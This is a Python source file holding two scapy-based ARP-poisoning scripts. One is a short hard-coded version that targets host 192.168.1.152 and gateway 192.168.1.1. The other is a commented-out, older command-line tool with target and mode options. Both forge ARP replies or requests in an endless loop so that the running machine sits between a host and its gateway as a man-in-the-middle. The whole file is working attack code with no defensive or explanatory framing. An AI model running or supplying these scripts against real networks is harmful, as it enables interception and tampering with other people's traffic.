# My utility
from scapy.all import (
    get_if_hwaddr,
    getmacbyip,
    ARP,
    Ether,
    sendp
)

def build_rep_to_host(self_mac):
    target_mac = getmacbyip('192.168.1.152')
    response_pkt_to_host = Ether(src=self_mac, dst=target_mac) / ARP(hwsrc=self_mac, psrc='192.168.1.1', hwdst=target_mac, pdst='192.168.1.152', op=2)
    return response_pkt_to_host

def build_req_to_gateway(self_mac):
    target_mac = getmacbyip('192.168.1.1')
    request_pkt_to_gateway = Ether(src=self_mac, dst=target_mac) / ARP(hwsrc=self_mac, psrc='192.168.1.152', hwdst=target_mac, pdst='192.168.1.1', op=1)
    return request_pkt_to_gateway

def main():
    self_mac = get_if_hwaddr('eth0')
    response_pkt_to_host = build_rep_to_host(self_mac)
    request_pkt_to_gateway = build_req_to_gateway(self_mac)

    response_pkt_to_host.show()
    request_pkt_to_gateway.show()

    while True:
        sendp(response_pkt_to_host, inter=2, iface='eth0')
        sendp(request_pkt_to_gateway, inter=2, iface='eth0')

if __name__ == '__main__':
    main()

# The original utility
'''
import os, sys, signal
from scapy.all import (
    get_if_hwaddr,
    getmacbyip,
    ARP,
    Ether,
    sendp
)
from optparse import OptionParser
def main():
    try:
        if os.geteuid() != 0:
            print "[-] Run me as root"
            sys.exit(1)
    except Exception, msg:
        print msg
    usage = 'Usage: %prog [-i interface] [-t target] host'
    parser = OptionParser(usage)
    parser.add_option('-i', dest='interface', help='Specify the interface to use')
    parser.add_option('-t', dest='target', help='Specify a particular host to ARP poison')
    parser.add_option('-m', dest='mode', default='req', help='Poisoning mode: requests (req) or replies (rep) [default: %default]')
    parser.add_option('-s', action='store_true', dest='summary', default=False, help='Show packet summary and ask for confirmation before poisoning')
    (options, args) = parser.parse_args()
    if len(args) != 1 or options.interface is None:
        parser.print_help()
        sys.exit(0)
    mac = get_if_hwaddr(options.interface)
    def build_req():
        if options.target is None:
            pkt = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc=mac, psrc=args[0], pdst=args[0])
        elif options.target:
            target_mac = getmacbyip(options.target)
            if target_mac is None:
                print "[-] Error: Could not resolve targets MAC address"
                sys.exit(1)
            pkt = Ether(src=mac, dst=target_mac) / ARP(hwsrc=mac, psrc=args[0], hwdst=target_mac, pdst=options.target)
        return pkt
    def build_rep():
        if options.target is None:
            pkt = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / ARP(hwsrc=mac, psrc=args[0], op=2)
        elif options.target:
            target_mac = getmacbyip(options.target)
            if target_mac is None:
                print "[-] Error: Could not resolve targets MAC address"
                sys.exit(1)
            pkt = Ether(src=mac, dst=target_mac) / ARP(hwsrc=mac, psrc=args[0], hwdst=target_mac, pdst=options.target, op=2)
        return pkt
    if options.mode == 'req':
        pkt = build_req()
    elif options.mode == 'rep':
        pkt = build_rep()
    if options.summary is True:
        pkt.show()
        ans = raw_input('\n[*] Continue? [Y|n]: ').lower()
        if ans == 'y' or len(ans) == 0:
            pass
        else:
            sys.exit(0)
    while True:
        sendp(pkt, inter=2, iface=options.interface)
if __name__ == '__main__':
    main()
'''
